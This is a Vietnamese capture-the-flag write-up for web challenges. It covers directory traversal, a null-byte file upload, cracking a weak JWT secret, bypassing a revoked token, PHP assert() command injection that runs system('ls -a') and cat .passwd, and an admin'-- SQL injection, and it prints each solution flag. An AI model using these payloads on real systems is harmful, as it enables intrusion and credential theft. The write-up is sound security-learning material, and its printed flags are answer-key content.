## 21. Directory traversal
- Bài này dò path ẩn qua truyền tham số vào biến galerie=.
- Phát hiện được 1 path lạ 86hwnX2r
```js
<table id="content">
        <tr>
            <td><img width="64px" height="64px" src="galerie//86hwnX2r" alt="86hwnX2r">
            </td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie//emotes" alt="emotes">
            </td>
            <td><img width="64px" height="64px" src="galerie//apps" alt="apps">
            </td>
            <td><img width="64px" height="64px" src="galerie//devices" alt="devices">
            </td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie//categories" alt="categories">
            </td>
            <td><img width="64px" height="64px" src="galerie//actions" alt="actions">
            </td>
        </tr>
    </table>
```
- Vô xem thì có file password đọc thôi
```js
<table id="content">
    <tr></tr>
    <tr>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt">
        </td>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg">
        </td>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png">
        </td>
    </tr>
    <tr></tr>
</table>
```
```js
Password: kcb$!Bx@v4Gs9Ez
```
## 22. File upload - Null byte
- Bài này lỗi ở kí tự null byte vì nó chỉ check đuôi file đến khi gặp kí tự null byte là dừng lại không check nữa nên chỉ cần chèn null byte vô tên file là thành công(injec.php%00.png)
- Lỗi này đã được fix từ phiên bản PHP 5.3.
![Screenshot 2022-05-13 122507](https://i.imgur.com/qne6vo0.png)
![Screenshot 2022-05-13 122521](https://i.imgur.com/67YXMTy.png)
```js
Password: YPNchi2NmTwygr2dgCCF
```
## 23. JSON Web Token (JWT) - Weak secret
- Vào đầu tiên thì họ có đưa một đoạn mess
```js
{"message": "Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."}
```
- Thì theo đường path /token thì có đưa một đoạn token jwt và yêu cầu POST bằng token đó.
```js
{"Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"}
```

- Sau khi post vô /admin thì nhận được mess này
```js
{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```
- Thêm trường Authorization vô thì nhận tiếp
```js
{"message": "I was right, you are not able to break my super crypto! I use HS512 so no need to have a strong secret!"}
```
- Vô jwt.io để xem trong token có gì 
```js
{"role": "guest"}
```
- Cần thay đổi role thành admin nhưng không có private key nêu do bài yêu cầu brute force password nên dùng jwt_tool để tìm.
![Screenshot 2022-05-14 150511](https://i.imgur.com/f1pgEMn.png)
- Private key là "lol" vậy chỉ cần mã hóa là xong.
![Screenshot 2022-05-14 150745](https://i.imgur.com/fbBgThl.png)
![Screenshot 2022-05-14 150758](https://i.imgur.com/HhdLGkp.png)

```js
Password: PleaseUseAStrongSecretNextTime
```
## 24. JWT - Revoked token
- Đầu tiên vô thì họ cho mess này
```js
POST : /web-serveur/ch63/login <br>
GET : /web-serveur/ch63/admin
```
- POST với login thì nhận được cần phải login dạng json
```js
{"msg":"Bad request. Submit your login / pass as {\"username\":\"admin\",\"password\":\"admin\"}"}
```
- Đăng nhập thì nhận được một token để login vô admin.
![Screenshot 2022-05-14 153527](https://i.imgur.com/igzNIiP.png)
- Vô trang login admin bằng token xem nhận được token bị revoked.
- Để ý đoạn code đề bài cho thì ngay khi đăng nhập thành công thì lập tức token bị cho vào black_list
```python
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
```
- Do đó khi kiểm tra thì token tại trường Authorization bị dính do đó cần bypass đoạn Authorization.
```python
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
```
- Theo như trường Authorization thì giá trị token sẽ bị base64 decode để đọc giữ liệu. Trong khi đó các kí tự "=" có thể bypass được vậy thêm dấu "=" vô sau token là được.

```python
{"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
```
## 25. PHP - assert()
- Đầu tiên vô trang index thì phát hiện path đều được truyền qua tham số ?page= điền ?page=' thì xuất hiện 1 lỗi.
```php
Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
``` 
- Có thể thấy được cú pháp của server là
```php
assert(strpos('include/'.$file.'.php', '..') === false)
```
- Inject vào thôi điền
```php
?page=test' , '') or system('ls -a');//
Lúc đó server sẽ trở thành
assert(strpos('include/test.php', '') or system(ls -a); // '..') === false)
```
- Và hiện file .passwd và đọc thôi

```js
Warning: strpos(): Empty delimiter in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 . .. ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php53-fpm.pool.inc .git .passwd includes index.php 'includes/alo' ,'') or system("ls -a");//.php'File does not exist

Thay lệnh cat .passwd ra flag

Warning: strpos(): Empty delimiter in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 The flag is / Le flag est : x4Ss3rT1nglSn0ts4f3A7A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/alo','') or system("cat .passwd");//.php'File does not exist
```

```js
Password: x4Ss3rT1nglSn0ts4f3A7A1Lx
```

## 25. PHP - Filters

## 40. SQL injection - Authentication
- Đầu tiên họ cho form đăng nhập thì vì lỗi SQL bình thường nên payload
```js
username = admin'--
password = admin
```
```js
Password: t0_W34k!$
```


